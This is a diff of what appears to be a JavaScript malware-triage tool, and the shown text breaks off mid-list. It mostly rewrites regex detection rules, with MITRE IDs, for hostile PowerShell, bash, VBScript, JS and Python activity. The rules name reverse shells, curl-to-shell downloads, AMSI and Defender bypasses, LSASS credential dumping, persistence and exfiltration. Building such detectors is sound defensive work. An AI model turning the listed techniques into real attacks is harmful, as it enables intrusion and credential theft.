@@ -6376,7 +6376,7 @@ Produce the triage assessment. Be specific to the values above — do not genera
     const dom = (email.split("@")[1] || "").toLowerCase();
     setHref("em_hunter",     `https://hunter.io/email-verifier/${e(email)}`);
     setHref("em_hibp",       `https://haveibeenpwned.com/account/${e(email)}`);
-    setHref("em_intelbase",  `https://intelbase.io/search?q=${e(email)}`);
+    setHref("em_intelbase",  `https://intelbase.is/search?q=${e(email)}`);
     setHref("em_emailrep",   `https://emailrep.io/${e(email)}`);
     setHref("em_epieos",     `https://epieos.com/?q=${e(email)}&t=email`);
     setHref("em_intelx",     `https://intelx.io/?s=${e(email)}`);
@@ -6858,118 +6858,158 @@ Note: external OSINT may not return results for private IPs.</div>`;
 
   const THREAT_INDICATORS = {
     powershell: [
-      { pattern: /\bDownloadString\b/gi,          sev: "critical", label: "Downloads & executes remote string",         mitre: ["T1059.001","T1105"] },
-      { pattern: /\bDownloadFile\b/gi,             sev: "high",    label: "Downloads file from remote URL",             mitre: ["T1105"] },
-      { pattern: /\bDownloadData\b/gi,             sev: "high",    label: "Downloads raw data from remote",             mitre: ["T1105"] },
-      { pattern: /\bWebClient\b/gi,                sev: "medium",  label: "Creates WebClient object (network activity)",mitre: ["T1071","T1105"] },
-      { pattern: /\bInvoke-WebRequest\b|\biwr\b/gi,sev: "medium",  label: "Web request via Invoke-WebRequest",          mitre: ["T1105","T1071"] },
-      { pattern: /\bcurl\b|\bwget\b/gi,            sev: "low",     label: "curl/wget download attempt",                 mitre: ["T1105"] },
-      { pattern: /\bIEX\b|\bInvoke-Expression\b/gi,sev: "critical",label: "IEX — executes arbitrary string as code",    mitre: ["T1059.001"] },
-      { pattern: /\bInvoke-Command\b|\bicm\b/gi,   sev: "high",    label: "Remote command execution",                   mitre: ["T1059.001","T1021"] },
-      { pattern: /\bStart-Process\b/gi,            sev: "medium",  label: "Spawns a new process",                       mitre: ["T1059","T1204"] },
-      { pattern: /\bShellExecute\b/gi,             sev: "high",    label: "ShellExecute — launches external process",   mitre: ["T1059","T1204"] },
-      { pattern: /\bcmd\.exe\b|\bcmd\s*\/[ck]/gi,  sev: "medium",  label: "Spawns cmd.exe subprocess",                  mitre: ["T1059.003"] },
-      { pattern: /\bwscript\b|\bcscript\b/gi,      sev: "high",    label: "Executes via WScript/CScript host",          mitre: ["T1059.005"] },
-      { pattern: /\bmshta\.exe\b|\bmshta\b/gi,     sev: "critical",label: "mshta — HTML Application host abuse (LOLBin)",mitre: ["T1218.005"] },
-      { pattern: /\bregsvr32\b/gi,                 sev: "high",    label: "regsvr32 — COM scriptlet abuse",             mitre: ["T1218.010"] },
-      { pattern: /\brundll32\b/gi,                 sev: "high",    label: "rundll32 — DLL proxy execution",             mitre: ["T1218.011"] },
-      { pattern: /\-enc\b|\-EncodedCommand\b/gi,   sev: "high",    label: "Base64-encoded command (-enc)",              mitre: ["T1027","T1059.001"] },
-      { pattern: /\-w\s*hidden|\-WindowStyle\s*[Hh]idden/gi, sev: "high", label: "Hidden window — anti-visibility",    mitre: ["T1564.003"] },
-      { pattern: /\-nop\b|\-NonInteractive\b/gi,   sev: "medium",  label: "-nop/-NonInteractive — evasion flag",        mitre: ["T1059.001"] },
-      { pattern: /\-ExecutionPolicy\s*[Bb]ypass/gi,sev: "critical",label: "Execution policy bypass",                    mitre: ["T1059.001","T1562"] },
-      { pattern: /\[Convert\]::FromBase64String/gi, sev: "high",   label: "Manual Base64 decode",                       mitre: ["T1027"] },
-      { pattern: /\[char\]\s*\d+/gi,               sev: "medium",  label: "Char-array obfuscation",                     mitre: ["T1027"] },
-      { pattern: /\$env:/gi,                       sev: "low",     label: "References environment variables",           mitre: ["T1082"] },
-      { pattern: /\bNew-ScheduledTask\b|\bRegister-ScheduledTask\b/gi, sev: "high", label: "Creates scheduled task (persistence)", mitre: ["T1053.005"] },
-      { pattern: /\bSet-ItemProperty.*Run\b/gi,    sev: "critical",label: "Writes to Run registry key (autostart)",     mitre: ["T1547.001"] },
-      { pattern: /HKCU:\\|HKLM:\\/gi,             sev: "medium",  label: "Modifies registry keys",                     mitre: ["T1547","T1112"] },
-      { pattern: /\bNew-Service\b|\bsc\.exe\b/gi,  sev: "high",    label: "Creates or modifies a Windows service",      mitre: ["T1543.003"] },
-      { pattern: /\bAdd-MpPreference\s+-Exclusion/gi,sev:"critical",label:"Adds AV/Defender exclusion (disables protection)",mitre:["T1562.001"] },
-      { pattern: /\bSet-MpPreference.*Disable/gi,  sev: "critical",label: "Disables Windows Defender",                  mitre: ["T1562.001"] },
-      { pattern: /\bDisable-WindowsOptionalFeature\b/gi,sev:"high",label:"Disables Windows security feature",           mitre: ["T1562"] },
-      { pattern: /\bwevtutil\b.*cl\b/gi,           sev: "critical",label: "Clears Windows event logs",                  mitre: ["T1070.001"] },
-      { pattern: /\bClear-EventLog\b/gi,           sev: "critical",label: "Clears event log (covers tracks)",           mitre: ["T1070.001"] },
-      { pattern: /\bSleep\b|\bStart-Sleep\b/gi,    sev: "low",     label: "Sleep delay — possible sandbox evasion",     mitre: ["T1497"] },
-      { pattern: /\bMimikatz\b|\bInvoke-Mimikatz\b/gi, sev:"critical",label:"Mimikatz credential dumping tool",        mitre:["T1003"] },
-      { pattern: /\blsass\b/gi,                    sev: "critical",label: "References lsass (credential dump target)",  mitre: ["T1003.001"] },
-      { pattern: /\bGet-Credential\b/gi,           sev: "medium",  label: "Credential harvesting attempt",              mitre: ["T1056"] },
-      { pattern: /\bSecureString\b/gi,             sev: "low",     label: "Uses SecureString (credential handling)",    mitre: ["T1078"] },
-      { pattern: /\bGet-Process\b|\bGet-Service\b/gi,sev:"low",    label: "Process/service enumeration",                mitre: ["T1057","T1007"] },
-      { pattern: /\bGet-NetAdapter\b|\bipconfig\b/gi,sev:"low",    label: "Network interface discovery",                mitre: ["T1016"] },
-      { pattern: /\bGet-ADUser\b|\bGet-ADComputer\b/gi,sev:"medium",label:"Active Directory enumeration",              mitre: ["T1087.002"] },
-      { pattern: /\bnet\s+user\b|\bnet\s+group\b/gi,sev:"medium", label: "User/group enumeration",                     mitre: ["T1087"] },
-      { pattern: /\bEnter-PSSession\b|\bNew-PSSession\b/gi,sev:"high",label:"PS remoting — lateral movement",          mitre:["T1021.006"] },
-      { pattern: /\bInvoke-WMIMethod\b|\bGet-WMIObject\b/gi,sev:"high",label:"WMI execution",                         mitre:["T1047"] },
-      { pattern: /\bwmic\b/gi,                     sev: "high",    label: "WMIC — WMI command-line abuse",              mitre: ["T1047"] },
-      { pattern: /\bSend-MailMessage\b/gi,         sev: "high",    label: "Email exfiltration attempt",                 mitre: ["T1048","T1567"] },
-      { pattern: /\bUploadString\b|\bUploadData\b/gi,sev:"high",   label: "Uploads data to remote server",              mitre: ["T1041","T1048"] },
-    ],
-    cmdline: [
-      { pattern: /certutil\s+.*(-urlcache|-decode|-encode)/gi,sev:"critical",label:"certutil LOLBin — download or decode payload",mitre:["T1105","T1140","T1218"] },
-      { pattern: /\bbitsadmin\b.*\/transfer/gi,    sev: "critical",label: "BITSAdmin — background download (LOLBin)",   mitre: ["T1197"] },
-      { pattern: /\bpowershell\b.*-[eE]nc/gi,      sev: "critical",label: "Spawns PowerShell with encoded command",     mitre: ["T1059.001","T1027"] },
-      { pattern: /\bpowershell\b.*-[wW]\s*[hH]idden/gi,sev:"high",label:"Hidden PowerShell window",                    mitre: ["T1564.003"] },
-      { pattern: /\bpowershell\b.*bypass/gi,       sev: "critical",label: "PowerShell execution policy bypass via CMD", mitre: ["T1059.001","T1562"] },
-      { pattern: /\bwscript\b|\bcscript\b/gi,      sev: "high",    label: "Script host execution",                      mitre: ["T1059.005"] },
-      { pattern: /\bmshta\b/gi,                    sev: "critical",label: "mshta LOLBin execution",                     mitre: ["T1218.005"] },
-      { pattern: /\bregsvr32\b/gi,                 sev: "high",    label: "regsvr32 LOLBin",                            mitre: ["T1218.010"] },
-      { pattern: /\brundll32\b/gi,                 sev: "high",    label: "rundll32 proxy execution",                   mitre: ["T1218.011"] },
-      { pattern: /\bschtasks\b.*\/create/gi,       sev: "high",    label: "Scheduled task creation",                    mitre: ["T1053.005"] },
-      { pattern: /\breg\s+add\b/gi,                sev: "medium",  label: "Registry key modification",                  mitre: ["T1547","T1112"] },
-      { pattern: /\bnet\s+user\b.*\/add/gi,        sev: "critical",label: "Creates new user account (backdoor)",        mitre: ["T1136"] },
-      { pattern: /\bnet\s+localgroup\s+administrators\b/gi,sev:"critical",label:"Adds user to Administrators group",   mitre:["T1136","T1078"] },
-      { pattern: /\bwevtutil\b.*cl\b/gi,           sev: "critical",label: "Clears event logs",                          mitre: ["T1070.001"] },
-      { pattern: /\bsc\s+(create|config|start)\b/gi,sev:"high",   label: "Service creation/modification",              mitre: ["T1543.003"] },
-      { pattern: /\bnetsh\b.*firewall/gi,          sev: "high",    label: "Firewall rule modification",                  mitre: ["T1562.004"] },
-      { pattern: /\bat\b|\bschtasks\b/gi,          sev: "medium",  label: "Task scheduling",                            mitre: ["T1053"] },
-      { pattern: /\bwmic\b.*process.*call.*create/gi,sev:"critical",label:"WMIC remote process creation",              mitre:["T1047"] },
-      { pattern: /\bftp\b.*-[si]:/gi,             sev: "high",    label: "FTP scripted transfer",                      mitre: ["T1048","T1105"] },
-      { pattern: /echo\s+.+>>/gi,                  sev: "low",     label: "File write via echo redirect",               mitre: ["T1027"] },
+      // ── Download & execution ──────────────────────────────────
+      { pattern:/\bDownloadString\b/gi,                                        sev:"critical", label:"Downloads & executes remote string (IEX+DownloadString)",          mitre:["T1059.001","T1105"] },
+      { pattern:/\bDownloadFile\b/gi,                                          sev:"critical", label:"Downloads file from remote URL",                                    mitre:["T1105"] },
+      { pattern:/\bInvoke-WebRequest\b/gi,                                     sev:"high",     label:"Invoke-WebRequest — HTTP fetch from remote host",                   mitre:["T1105","T1071.001"] },
+      { pattern:/\bStart-BitsTransfer\b/gi,                                    sev:"high",     label:"BITS transfer — background file download (LOLBin)",                 mitre:["T1197"] },
+      { pattern:/\bInvoke-Expression\b|\bIEX\b/gi,                             sev:"critical", label:"Invoke-Expression / IEX — dynamic code execution",                  mitre:["T1059.001"] },
+      // ── Obfuscation & encoding ────────────────────────────────
+      { pattern:/-(?:enc|EncodedCommand)\s+[A-Za-z0-9+/]{20,}/gi,             sev:"critical", label:"Base64 encoded PowerShell command (-enc)",                          mitre:["T1027","T1059.001"] },
+      { pattern:/\[Convert\]::FromBase64String/gi,                             sev:"high",     label:"Base64 decode in-script",                                           mitre:["T1027","T1140"] },
+      { pattern:/\$(?:env:)?(?:COMSPEC|windir|SystemRoot).*-[cCkK]/gi,        sev:"high",     label:"CMD execution via environment variable (LOLBin)",                   mitre:["T1059.003"] },
+      { pattern:/-join\s*['"][^'"]{0,3}['"]/gi,                                sev:"medium",   label:"String join obfuscation — characters assembled at runtime",         mitre:["T1027"] },
+      { pattern:/\[char\]\s*\d{2,3}/gi,                                        sev:"medium",   label:"Char-code string obfuscation",                                      mitre:["T1027"] },
+      // ── Defense evasion ───────────────────────────────────────
+      { pattern:/Set-MpPreference\s+-Disable/gi,                               sev:"critical", label:"Disables Windows Defender real-time monitoring",                    mitre:["T1562.001"] },
+      { pattern:/Add-MpPreference\s+-ExclusionPath/gi,                         sev:"critical", label:"Adds AV exclusion path — hides malware from Defender",              mitre:["T1562.001"] },
+      { pattern:/\[Ref\]\.Assembly\.GetType.*AMSI/gi,                          sev:"critical", label:"AMSI bypass — disables antimalware scan interface",                 mitre:["T1562.001"] },
+      { pattern:/amsiInitFailed|AmsiScanBuffer|amsi\.dll/gi,                   sev:"critical", label:"AMSI patching/bypass pattern",                                      mitre:["T1562.001"] },
+      { pattern:/-ExecutionPolicy\s+(?:Bypass|Unrestricted|RemoteSigned)/gi,   sev:"high",     label:"Execution policy bypass",                                           mitre:["T1059.001"] },
+      { pattern:/\bHidden\b.*\bWindowStyle\b|\bWindowStyle\b.*\bHidden\b/gi,  sev:"high",     label:"Hidden window — runs without visible console",                      mitre:["T1564.003"] },
+      { pattern:/netsh\s+(?:advfirewall|firewall)\s+set.*disable/gi,           sev:"critical", label:"Disables Windows Firewall",                                         mitre:["T1562.004"] },
+      // ── Persistence ───────────────────────────────────────────
+      { pattern:/HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run/gi,  sev:"critical", label:"Registry Run key persistence (HKCU)",                               mitre:["T1547.001"] },
+      { pattern:/HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run/gi,  sev:"critical", label:"Registry Run key persistence (HKLM — system-wide)",                 mitre:["T1547.001"] },
+      { pattern:/New-ScheduledTask|Register-ScheduledTask|schtasks/gi,         sev:"critical", label:"Scheduled task persistence",                                        mitre:["T1053.005"] },
+      { pattern:/Startup\b.*\.(?:ps1|bat|exe|vbs|js)/gi,                       sev:"high",     label:"Startup folder persistence — drops file in startup",                mitre:["T1547.001"] },
+      { pattern:/New-Service|sc\.exe\s+create/gi,                              sev:"critical", label:"Creates Windows service for persistence",                           mitre:["T1543.003"] },
+      // ── Credential theft ──────────────────────────────────────
+      { pattern:/lsass/gi,                                                      sev:"critical", label:"LSASS access — credential dumping attempt",                         mitre:["T1003.001"] },
+      { pattern:/sekurlsa|logonpasswords|mimikatz/gi,                           sev:"critical", label:"Mimikatz credential extraction",                                    mitre:["T1003.001"] },
+      { pattern:/comsvcs\.dll.*MiniDump/gi,                                    sev:"critical", label:"LSASS dump via comsvcs.dll (LOLBin)",                               mitre:["T1003.001"] },
+      { pattern:/Get-Credential\b|ConvertTo-SecureString/gi,                   sev:"medium",   label:"Credential handling — may capture or process credentials",          mitre:["T1056","T1555"] },
+      // ── Lateral movement ──────────────────────────────────────
+      { pattern:/Invoke-Command\b.*-ComputerName/gi,                           sev:"high",     label:"Remote command execution via PowerShell remoting",                  mitre:["T1021.006"] },
+      { pattern:/Enter-PSSession|New-PSSession/gi,                             sev:"high",     label:"PowerShell remote session",                                         mitre:["T1021.006"] },
+      { pattern:/\bwmic\b.*\/node:/gi,                                         sev:"high",     label:"WMI remote execution (wmic /node)",                                 mitre:["T1047"] },
+      // ── Process injection / memory ────────────────────────────
+      { pattern:/VirtualAlloc|VirtualAllocEx/gi,                               sev:"critical", label:"Memory allocation for shellcode injection",                         mitre:["T1055"] },
+      { pattern:/WriteProcessMemory/gi,                                        sev:"critical", label:"Process memory write — code injection",                             mitre:["T1055"] },
+      { pattern:/CreateRemoteThread/gi,                                        sev:"critical", label:"Remote thread creation — classic DLL injection",                   mitre:["T1055.001"] },
+      { pattern:/\[Runtime\.InteropServices\.Marshal\]/gi,                     sev:"high",     label:"Unmanaged memory/P-Invoke — native code execution from PS",         mitre:["T1055","T1106"] },
+      // ── Recon ─────────────────────────────────────────────────
+      { pattern:/Get-ADUser|Get-ADComputer|Get-ADGroup/gi,                     sev:"high",     label:"Active Directory enumeration",                                      mitre:["T1087.002","T1069.002"] },
+      { pattern:/Get-NetIPConfiguration|Get-NetAdapter/gi,                     sev:"medium",   label:"Network configuration discovery",                                   mitre:["T1016"] },
+      { pattern:/whoami|net\s+user|net\s+localgroup/gi,                        sev:"medium",   label:"User/group reconnaissance",                                         mitre:["T1033","T1069"] },
+      // ── Exfiltration ──────────────────────────────────────────
+      { pattern:/Send-MailMessage/gi,                                          sev:"high",     label:"Sends email — possible data exfiltration via SMTP",                 mitre:["T1048.003"] },
+      { pattern:/Invoke-WebRequest\s+-Method\s+POST/gi,                        sev:"high",     label:"HTTP POST — data exfiltration via web request",                     mitre:["T1048.003","T1071.001"] },
+      // ── ClickFix / 2024-2025 trends ───────────────────────────
+      { pattern:/mshta\s+https?:/gi,                                           sev:"critical", label:"MSHTA remote HTA execution (ClickFix / living-off-land)",           mitre:["T1218.005"] },
+      { pattern:/\bwmic\b.*process.*call.*create/gi,                           sev:"critical", label:"WMIC process creation — command execution LOLBin",                  mitre:["T1047"] },
+      { pattern:/odbcconf.*\/a.*regsvr/gi,                                     sev:"critical", label:"OdbcConf LOLBin — DLL execution via ODBC",                          mitre:["T1218.008"] },
     ],
     bash: [
-      { pattern: /\bcurl\b.*(-o|-O|sh\b|\|\s*bash)/gi,sev:"critical",label:"curl piped to bash — remote exec pattern",mitre:["T1059.004","T1105"] },
-      { pattern: /\bwget\b.*(-O\s*-|\|\s*bash|\|\s*sh)/gi,sev:"critical",label:"wget piped to shell",                 mitre:["T1059.004","T1105"] },
-      { pattern: /\bchmod\b.*\+x/gi,              sev: "medium",  label: "Makes file executable",                      mitre: ["T1059"] },
-      { pattern: /\bcrontab\b/gi,                  sev: "high",    label: "Cron job modification (persistence)",        mitre: ["T1053.003"] },
-      { pattern: /\/etc\/cron/gi,                  sev: "high",    label: "Cron directory modification",               mitre: ["T1053.003"] },
-      { pattern: /\.bashrc|\.profile|\.bash_profile/gi,sev:"high",label:"Shell profile modification (persistence)",    mitre:["T1546.004"] },
-      { pattern: /\bbase64\b.*-d/gi,              sev: "high",    label: "Base64 decode in shell",                     mitre: ["T1027","T1140"] },
-      { pattern: /\bnc\b.*-[el]|\bnetcat\b/gi,    sev: "critical",label: "Netcat reverse/bind shell",                  mitre: ["T1059","T1071"] },
-      { pattern: /\/dev\/tcp\//gi,                 sev: "critical",label: "Bash TCP redirect — reverse shell indicator",mitre: ["T1059.004"] },
-      { pattern: /\bsudo\b.*-[si]/gi,             sev: "high",    label: "sudo privilege escalation attempt",          mitre: ["T1068","T1548"] },
-      { pattern: /\bpasswd\b|\bshadow\b/gi,       sev: "critical",label: "References password/shadow file",            mitre: ["T1003.008"] },
-      { pattern: /\bssh\b.*-R\b/gi,              sev: "high",    label: "SSH reverse tunnel",                          mitre: ["T1572","T1021.004"] },
-      { pattern: /\biptables\b.*-[FXZ]/gi,        sev: "high",    label: "Flushes firewall rules",                     mitre: ["T1562.004"] },
-      { pattern: /\bHistory\b|\bhistory\s+-c/gi,  sev: "medium",  label: "Clears shell history",                       mitre: ["T1070.003"] },
-      { pattern: /\buname\b|\bwhoami\b|\bid\b/gi, sev: "low",     label: "System/user discovery",                      mitre: ["T1082","T1033"] },
-      { pattern: /\bpython\b.*-c\b|\bpython3\b.*-c\b/gi,sev:"high",label:"Python one-liner execution",               mitre:["T1059.006"] },
-      { pattern: /\benv\b.*python|\/usr\/bin\/python/gi,sev:"medium",label:"Python invocation via env",               mitre:["T1059.006"] },
+      // ── Download & exec ───────────────────────────────────────
+      { pattern:/curl\s+.*\|\s*(?:bash|sh)/gi,                                 sev:"critical", label:"Curl pipe to shell — remote code execution",                       mitre:["T1059.004","T1105"] },
+      { pattern:/wget\s+.*\|\s*(?:bash|sh)/gi,                                 sev:"critical", label:"Wget pipe to shell — remote code execution",                       mitre:["T1059.004","T1105"] },
+      { pattern:/curl\s+-s\s+-o\s+|wget\s+-q\s+-O/gi,                          sev:"high",     label:"Silent file download to disk",                                      mitre:["T1105"] },
+      { pattern:/bash\s+-i\s*>&\s*\/dev\/tcp/gi,                               sev:"critical", label:"Bash reverse shell via /dev/tcp",                                   mitre:["T1059.004"] },
+      { pattern:/\/dev\/tcp\/\d{1,3}\.\d{1,3}/gi,                              sev:"critical", label:"TCP socket shell — reverse or bind shell connection",               mitre:["T1059.004"] },
+      // ── Obfuscation ───────────────────────────────────────────
+      { pattern:/echo\s+[A-Za-z0-9+/]{20,}={0,2}\s*\|\s*base64\s+-d/gi,       sev:"critical", label:"Base64 decode + execute — encoded payload",                        mitre:["T1027","T1140"] },
+      { pattern:/\$\(.*base64.*\)/gi,                                           sev:"high",     label:"In-line base64 decode (command substitution)",                      mitre:["T1027"] },
+      { pattern:/python[23]?\s+-c\s+['"].*exec/gi,                             sev:"critical", label:"Python inline exec — dynamic code execution",                       mitre:["T1059.006"] },
+      // ── Persistence ───────────────────────────────────────────
+      { pattern:/crontab\s+-[el]/gi,                                            sev:"high",     label:"Crontab modification — scheduled persistence",                      mitre:["T1053.003"] },
+      { pattern:/(\/etc\/cron\.|\/var\/spool\/cron)/gi,                         sev:"high",     label:"Cron file modification for persistence",                            mitre:["T1053.003"] },
+      { pattern:/~\/\.(?:bashrc|bash_profile|profile|zshrc)/gi,                sev:"high",     label:"Shell profile modification — user persistence",                     mitre:["T1546.004"] },
+      { pattern:/systemctl\s+enable\s+\S+\.service/gi,                         sev:"high",     label:"Systemd service enabled for persistence",                           mitre:["T1543.002"] },
+      { pattern:/echo\s+.*>>\s*\/etc\/rc\.(?:local|d)/gi,                      sev:"high",     label:"RC startup script persistence",                                     mitre:["T1037.004"] },
+      // ── Privilege escalation ──────────────────────────────────
+      { pattern:/chmod\s+(?:\+s|4[0-7]{3})\s/gi,                               sev:"critical", label:"SUID bit set — privilege escalation vector",                        mitre:["T1548.001"] },
+      { pattern:/sudo\s+-\s*S\s*<<</gi,                                         sev:"critical", label:"sudo with heredoc — automated privilege escalation",               mitre:["T1548.003"] },
+      { pattern:/\/etc\/passwd|\/etc\/shadow/gi,                                sev:"critical", label:"Credential file access (passwd/shadow)",                            mitre:["T1003.008"] },
+      // ── Lateral movement & C2 ─────────────────────────────────
+      { pattern:/ssh\s+-(?:o\s+StrictHostKey|i\s+.*\.pem)/gi,                  sev:"high",     label:"SSH with key/no-verify — lateral movement",                         mitre:["T1021.004"] },
+      { pattern:/nc\s+-[eluvzw]+\s+.*\d{2,5}/gi,                               sev:"critical", label:"Netcat listener/connector — reverse shell or exfil",               mitre:["T1059.004","T1048"] },
+      // ── Cryptomining (2024-2025) ──────────────────────────────
+      { pattern:/xmrig|stratum\+tcp:\/\/|minerd\b/gi,                          sev:"critical", label:"Cryptominer detected (XMRig/stratum protocol)",                     mitre:["T1496"] },
+      { pattern:/\bpool\.\w+\.(com|net)\s+.*wallet/gi,                         sev:"critical", label:"Mining pool connection with wallet address",                        mitre:["T1496"] },
     ],
     vbs: [
-      { pattern: /\bCreateObject\s*\(\s*["']WScript\.Shell["']\)/gi,sev:"critical",label:"WScript.Shell — command execution",mitre:["T1059.005"] },
-      { pattern: /\bCreateObject\s*\(\s*["']MSXML2\.XMLHTTP["']/gi, sev:"critical",label:"XMLHTTP — remote download",      mitre:["T1105","T1071"] },
-      { pattern: /\bCreateObject\s*\(\s*["']Scripting\.FileSystemObject["']/gi,sev:"medium",label:"FileSystemObject access",mitre:["T1083"] },
-      { pattern: /\bCreateObject\s*\(\s*["']Shell\.Application["']/gi,sev:"high",label:"Shell.Application — LOLBin exec",  mitre:["T1218"] },
-      { pattern: /\bWScript\.Run\b/gi,            sev: "critical",label: "WScript.Run — executes command",               mitre: ["T1059.005"] },
-      { pattern: /\.Run\s*\([^)]*,\s*0/gi,        sev: "high",    label: "Hidden window execution (,0 parameter)",      mitre: ["T1564.003"] },
-      { pattern: /\bExecute\b|\bEval\b/gi,         sev: "high",    label: "Dynamic code evaluation",                     mitre: ["T1059.005","T1027"] },
-      { pattern: /Chr\s*\(\s*\d+\s*\)/gi,         sev: "medium",  label: "Chr() obfuscation",                           mitre: ["T1027"] },
-      { pattern: /\bRegWrite\b/gi,                 sev: "high",    label: "Registry write operation",                    mitre: ["T1547","T1112"] },
-      { pattern: /\bSendKeys\b/gi,                 sev: "medium",  label: "SendKeys — keyboard simulation",              mitre: ["T1056"] },
+      { pattern:/\bCreateObject\b.*\bShell\b/gi,                               sev:"critical", label:"Creates Shell object — command execution",                          mitre:["T1059.005"] },
+      { pattern:/\bWscript\.Shell\b/gi,                                         sev:"critical", label:"WScript.Shell — executes OS commands",                              mitre:["T1059.005"] },
+      { pattern:/\bShell\b.*\bCmd\b|\bCmd\b.*\/[cCkK]/gi,                      sev:"critical", label:"CMD execution via VBScript",                                        mitre:["T1059.003","T1059.005"] },
+      { pattern:/\bXMLHTTP\b|\bServerXMLHTTP\b/gi,                              sev:"high",     label:"HTTP request object — downloads remote content",                    mitre:["T1105","T1071.001"] },
+      { pattern:/\bADODB\.Stream\b/gi,                                          sev:"high",     label:"ADODB.Stream — reads/writes binary/file data",                      mitre:["T1105","T1027"] },
+      { pattern:/\bRegWrite\b|\bRegRead\b/gi,                                   sev:"high",     label:"Registry read/write via VBScript",                                   mitre:["T1547.001","T1112"] },
+      { pattern:/\bAutoOpen\b|\bDocument_Open\b|\bAuto_Open\b/gi,              sev:"critical", label:"Auto-execution macro — runs on document open",                      mitre:["T1137.001"] },
+      { pattern:/\bWScript\.Sleep\b.*\d{4,}/gi,                                sev:"medium",   label:"Long sleep delay — sandbox evasion / timing check",                mitre:["T1497.003"] },
+      { pattern:/Chr\s*\(\s*\d{2,3}\s*\)/gi,                                   sev:"medium",   label:"Chr() obfuscation — strings built from char codes",                 mitre:["T1027"] },
+      { pattern:/\bStrReverse\b/gi,                                             sev:"medium",   label:"StrReverse — reversed string obfuscation",                          mitre:["T1027"] },
     ],
     js: [
-      { pattern: /\bWScript\.Shell\b|\bWScript\.CreateObject\b/gi,sev:"critical",label:"WScript.Shell via JScript",    mitre:["T1059.007"] },
-      { pattern: /\bnew\s+ActiveXObject\s*\(\s*["']WScript/gi,    sev:"critical",label:"ActiveX WScript object",       mitre:["T1059.007"] },
-      { pattern: /\bnew\s+ActiveXObject\s*\(\s*["']MSXML/gi,      sev:"critical",label:"MSXML HTTP request (download)",mitre:["T1105","T1071"] },
-      { pattern: /\beval\s*\(/gi,                  sev: "critical",label: "eval() — dynamic code execution",            mitre: ["T1059.007","T1027"] },
-      { pattern: /\bFunction\s*\(\s*['"].*['"]\s*\)/gi,sev:"high",label:"Function constructor code exec",              mitre:["T1059.007"] },
-      { pattern: /document\.write\s*\(/gi,         sev: "medium",  label: "document.write — DOM injection",             mitre: ["T1059.007"] },
-      { pattern: /\bunescape\s*\(/gi,              sev: "high",    label: "unescape() — string deobfuscation",          mitre: ["T1027"] },
-      { pattern: /String\.fromCharCode\s*\(/gi,    sev: "high",    label: "fromCharCode — char-code obfuscation",       mitre: ["T1027"] },
-      { pattern: /\btop\[.+\]\s*\(/gi,             sev: "high",    label: "Property access obfuscation",                mitre: ["T1027"] },
-      { pattern: /\\\d{3}|\\\x[0-9a-f]{2}/gi,     sev: "medium",  label: "Octal/hex escape obfuscation",               mitre: ["T1027"] },
+      { pattern:/\beval\s*\(/gi,                                                sev:"critical", label:"eval() — dynamic code execution, common in obfuscated malware",    mitre:["T1059.007"] },
+      { pattern:/new\s+ActiveXObject\s*\(/gi,                                   sev:"critical", label:"ActiveXObject — accesses COM/Windows objects from JS",              mitre:["T1059.007","T1106"] },
+      { pattern:/WScript\.Shell|WshShell/gi,                                    sev:"critical", label:"WScript.Shell via JScript — OS command execution",                  mitre:["T1059.007","T1059.003"] },
+      { pattern:/\.Run\s*\(|\.Exec\s*\(/gi,                                     sev:"critical", label:"Process execution from script (Run/Exec)",                          mitre:["T1059"] },
+      { pattern:/XMLHttpRequest|new\s+XMLHttp/gi,                               sev:"high",     label:"XHR — HTTP request to remote resource",                             mitre:["T1071.001","T1105"] },
+      { pattern:/document\.write\s*\(\s*(?:unescape|atob|String\.fromCharCode)/gi, sev:"critical", label:"DOM write with decode — obfuscated content injection",          mitre:["T1027","T1059.007"] },
+      { pattern:/String\.fromCharCode\s*\(\s*\d/gi,                             sev:"high",     label:"String.fromCharCode obfuscation",                                   mitre:["T1027"] },
+      { pattern:/unescape\s*\(\s*['"]%/gi,                                      sev:"high",     label:"unescape() URL-encoded payload execution",                          mitre:["T1027"] },
+      { pattern:/Function\s*\(\s*['"]return/gi,                                 sev:"high",     label:"Function constructor — dynamic function creation (obfuscation)",    mitre:["T1027","T1059.007"] },
+      { pattern:/\bsetTimeout\b.*eval|setInterval.*eval/gi,                     sev:"high",     label:"Deferred eval execution — sandbox evasion technique",               mitre:["T1497","T1059.007"] },
+      // ── 2024: ClickFix / fake CAPTCHA JS ──────────────────────
+      { pattern:/navigator\.clipboard\.writeText|document\.execCommand.*copy/gi, sev:"high",   label:"Clipboard write — ClickFix / fake CAPTCHA clipboard injection",    mitre:["T1059","T1204.002"] },
+      { pattern:/window\.location\s*=\s*['"](?:javascript:|data:)/gi,           sev:"critical", label:"JavaScript/data URI redirect — malicious code execution",           mitre:["T1059.007"] },
     ],
-  };
+    python: [
+      { pattern:/\bexec\s*\(|eval\s*\(/gi,                                      sev:"critical", label:"exec()/eval() — dynamic code execution",                            mitre:["T1059.006"] },
+      { pattern:/import\s+subprocess|subprocess\.(?:call|Popen|run)/gi,         sev:"high",     label:"subprocess — executes OS commands from Python",                     mitre:["T1059.006"] },
+      { pattern:/import\s+os;?\s*os\.(?:system|popen|execvp)/gi,                sev:"critical", label:"os.system/popen — shell command execution",                         mitre:["T1059.006"] },
+      { pattern:/socket\.connect\s*\(\s*\(|socket\.bind/gi,                     sev:"high",     label:"Raw socket connection — C2 channel or reverse shell",               mitre:["T1095","T1059.006"] },
+      { pattern:/base64\.(?:b64decode|decodebytes)/gi,                          sev:"high",     label:"Base64 decode — encoded payload",                                   mitre:["T1027","T1140"] },
+      { pattern:/marshal\.loads|pickle\.loads/gi,                               sev:"critical", label:"Pickle/marshal deserialization — arbitrary code execution risk",    mitre:["T1059.006"] },
+      { pattern:/ctypes\.windll|ctypes\.cdll/gi,                                sev:"critical", label:"ctypes Win32 API — process injection or system-level access",       mitre:["T1055","T1106"] },
+      { pattern:/cryptography|Fernet|AES\b|RSA\b/gi,                            sev:"medium",   label:"Cryptography library — may be ransomware or data hiding",           mitre:["T1486","T1027"] },
+      { pattern:/PyInstaller|py2exe|cx_Freeze/gi,                               sev:"medium",   label:"Executable packer — script compiled to standalone binary",          mitre:["T1027.002"] },
+      // ── 2024: Python info-stealers ────────────────────────────
+      { pattern:/keylogger|keyboard\.(?:on_press|Listener)/gi,                  sev:"critical", label:"Keylogger — captures keystrokes",                                   mitre:["T1056.001"] },
